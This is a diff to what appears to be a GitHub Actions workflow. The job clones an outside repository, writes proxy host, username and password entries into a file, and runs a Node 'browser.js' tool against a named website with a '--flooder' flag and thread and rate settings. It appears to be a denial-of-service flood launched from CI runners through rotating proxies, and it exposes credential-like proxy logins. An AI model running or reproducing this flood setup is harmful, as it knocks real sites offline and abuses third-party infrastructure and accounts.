@@ -34,8 +34,8 @@ jobs:
           git clone https://github.com/Fegp1p2/ideal-guide.git
           cd ideal-guide
           
-          echo '213.209.159.15:81:user_703f8f4979-country-kr:4ca02713d4430f2e' >> 2.txt
-          echo '213.209.159.15:81:user_703f8f4979-country-jp:4ca02713d4430f2e' >> 2.txt
+          echo '213.209.159.15:81:user_703f8f4979-country-jp-session-12323-time-1800:4ca02713d4430f2e' >> 2.txt
+          echo '213.209.159.15:81:user_703f8f4979-country-jp-session-12323-time-1800:4ca02713d4430f2e' >> 2.txt
           xvfb-run -a node browser.js https://cr-496.com/ 300 4 64 2.txt --debug true --flooder true --auth true
           
           
